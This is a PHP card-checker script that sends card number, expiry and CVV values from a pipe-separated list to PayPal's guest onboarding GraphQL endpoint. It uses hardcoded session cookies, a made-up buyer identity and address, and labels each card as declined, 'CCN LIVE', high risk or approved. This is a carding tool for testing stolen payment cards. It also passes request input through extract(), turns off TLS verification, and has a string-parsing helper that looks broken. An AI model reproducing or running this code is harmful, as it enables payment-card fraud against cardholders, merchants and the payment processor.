<?php

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string); 
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

###CHECKER PART###  
$zip = rand(10001,90045);
$time = rand(30000,699999);
$rand = rand(0,99999);
$pass = rand(0000000000,9999999999);
$email = substr(md5(mt_rand()), 0, 7);
$name = substr(md5(mt_rand()), 0, 7);
$last = substr(md5(mt_rand()), 0, 7);


/////////////////////==========[Unavailable if empty]==========////////////////


if (empty($schemename)) {
	$schemename = "Unavailable";
}
if (empty($typename)) {
	$typename = "Unavailable";
}
if (empty($brand)) {
	$brand = "Unavailable";
}
if (empty($bank)) {
	$bank = "Unavailable";
}
if (empty($cname)) {
	$cname = "Unavailable";
}
if (empty($phone)) {
	$phone = "Unavailable";
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?OnboardGuestMutation');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Accept-Language: en-US,en;q=0.9',
'Connection: keep-alive',
'Cookie: cookie_check=yes; TfXMWj95u2_Zf1Kmv_GCUOjlGG8=o9PXlqcZBKLkNRcmq-askvRWunmrW371BCx9ElRAPvqwySinxidndUcqFDaNFmK-mCWA4rDyGbugNfyvGICFRPVPVrQxjdPJey-G5sA1pFJ98AVtLsEFIZl793EbUwB9UnPtnyG8W1AlGFFEaGNZCU84vjPjy_IKpHsGqW; d_id=1690407740782; KHcl0EuY7AKSMgfvHl7J5E7hPtK=5a588jhlBuE1lTB7p0L_xT2_nROdUT-yhofRerWFl3tDWIaAwxiDJw4PrBfTiT0ELFLaGeLsiVGEXO0W; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; _gcl_au=1.1.1549138222.1691481386; _ga=GA1.2.312181090.1691481648; login_email=avinash%40gmail.com; rmuc=kT9bKLVE01oOB851nltg0ixygX6vWa1_wDJ9e7KTmp_NRuBHibFnaM77pySzQYxKC8k24BHcsT8g1ssjUQ0VV7Cm1ODo0pva9BLqVwAM_MuDVPnrtPJdtJ_f-_zGXKqiCwvuuH_lImdyFCMlWlkhsJSqLcW; _gid=GA1.2.1001365660.1692097767; LANG=en_US%3BUS; l7_az=dcg01.phx; ts_c=vr%3Dfd41700e1880a7a093f69e82fdc34d60%26vt%3Dfdd88f121890a2d08350821efd70f7c2; enforce_policy=ccpa; TLTSID=85731378242774858574234100319887; _gat_gtag_UA_53389718_12=1; tcs=main%3Axo%3Alite%7Ccss-ltr-heh09k-button-Button; nsid=s%3A9I7GHGTA-EL_ePWTWMIAHZJaiKIs4Aw9.SHdaft5ja%2BXue%2F1%2Bu3WuN09pdHF19kePjc9GxzpN2%2BM; x-pp-s=eyJ0IjoiMTY5MjE4MjY3MjkwMCIsImwiOiIwIiwibSI6IjAifQ; tsrce=graphqlnodeweb; ts=vreXpYrS%3D1786877072%26vteXpYrS%3D1692184472%26vr%3Dfd41700e1880a7a093f69e82fdc34d60%26vt%3Dfdd88f121890a2d08350821efd70f7c2%26vtyp%3Dreturn',
'Host: www.paypal.com',
'Origin: https://www.paypal.com',
'Referer: https://www.paypal.com/checkoutweb/signup?token=7WJ161017U931261L&useraction=commit&rm=2&mfid=1692182563366_f3976571a62f4&ssrt=1692182564159&rcache=1&cookieBannerVariant=hidden&country.x=US&locale.x=en_US&locale.x=en_US&country.x=US',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
'X-Requested-With: fetch',
'accept: */*',
'content-type: application/json',
'paypal-client-context: 7WJ161017U931261L',
'paypal-client-metadata-id: 7WJ161017U931261L',
'sec-ch-ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
'sec-ch-ua-arch: "x86"',
'sec-ch-ua-bitness: "64"',
'sec-ch-ua-full-version: "116.0.5845.96"',
'sec-ch-ua-full-version-list: "Chromium";v="116.0.5845.96", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.96"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-model: ""',
'sec-ch-ua-platform: "Windows"',
'sec-ch-ua-platform-version: "15.0.0"',
'sec-ch-ua-wow64: ?0',
'x-app-name: checkoutuinodeweb_weasley',
'x-country: US',
'x-locale: en_US'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/paypal/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/paypal/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"OnboardGuestMutation","variables":{"card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","securityCode":"'.$cvv.'","type":"VISA"},"country":"US","email":"avinash@gmail.com","firstName":"Avi","lastName":"verma","phone":{"countryCode":"1","number":"5874963215","type":"MOBILE"},"supportedThreeDsExperiences":["IFRAME"],"token":"7WJ161017U931261L","billingAddress":{"line1":"7215 Skillman St #300","city":"Dallas","state":"TX","postalCode":"75231","accountQuality":{"autoCompleteType":"MERCHANT_PREFILLED","isUserModified":false,"twoFactorPhoneVerificationId":""},"country":"US","familyName":"verma","givenName":"Avi"},"shippingAddress":{"line1":"7215 Skillman St #300","city":"Dallas","state":"TX","postalCode":"75231","accountQuality":{"autoCompleteType":"MERCHANT_PREFILLED","isUserModified":false,"twoFactorPhoneVerificationId":""},"country":"US","familyName":"verma","givenName":"Avi"},"crsData":null},"query":"mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String!, $lastName: String!, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $supportedThreeDsExperiences: [ThreeDSPaymentExperience], $token: String!) {  onboardAccount: onboardGuest(    bank: $bank    billingAddress: $billingAddress    card: $card    country: $country    currencyConversionType: $currencyConversionType    dateOfBirth: $dateOfBirth    email: $email    firstName: $firstName    lastName: $lastName    phone: $phone    shareAddressWithDonatee: $shareAddressWithDonatee    shippingAddress: $shippingAddress    token: $token  ) {    buyer {      auth {        accessToken        __typename      }      userId      __typename    }    flags {      is3DSecureRequired      __typename    }    ...fundingOptions    paymentContingencies {      threeDomainSecure(experiences: $supportedThreeDsExperiences) {        status        redirectUrl {          href          __typename        }        method        parameter        experience        requestParams {          key          value          __typename        }        __typename      }      ...threeDSContingencyData      __typename    }    __typename  }}fragment fundingOptions on CheckoutSession {  fundingOptions {    allPlans {      fundingSources {        fundingInstrument {          id          __typename        }        amount {          currencyCode          currencyValue          __typename        }        __typename      }      __typename    }    __typename  }  __typename}fragment threeDSContingencyData on PaymentContingencies {  threeDSContingencyData {    name    causeName    resolution {      type      resolutionName      paymentCard {        billingAddress {          line1          line2          city          state          country          postalCode          __typename        }        expireYear        expireMonth        currencyCode        cardProductClass        id        encryptedNumber        type        number        bankIdentificationNumber        __typename      }      contingencyContext {        deviceDataCollectionUrl {          href          __typename        }        jwtSpecification {          jwtDuration          jwtIssuer          jwtOrgUnitId          type          __typename        }        reason        referenceId        source        __typename      }      __typename    }    __typename  }  __typename}"}');
$result1 = curl_exec($ch);
          
$id = GetStr($result1,'fundingInstrument":{"id":"','"');
$msg1 = GetStr($result1,'"code":"','"');
$msg3 = GetStr($result1,'message":"','"');

if (strpos($result1, 'DECLINE') || strpos($result1, 'CARD_GENERIC_ERROR'))
 { $msg = $msg1;
   $sta = 'Declined❌';
 }
elseif (strpos($result1, 'INVALID_SECURITY_CODE'))
 { $msg = $msg1;
  $sta = 'CCN LIVE✅';
 
 }
  elseif (strpos($result1, 'RISK_DISALLOWED'))
 { $msg = "RISK_DISALLOWED⚠️";
  $sta = 'High Risk⚠️';
 } 
  elseif (strpos($result1, 'FundingInstrument'))
 { $msg = "Approved✅";
  $sta = 'Trial Started';
 } 
else
 { $msg = "Declined❌";
  $sta = 'Your card was Declined❌';
 }           
 echo"┠ Status ⇝ $sta  Resp ⇝ $msg";
?>
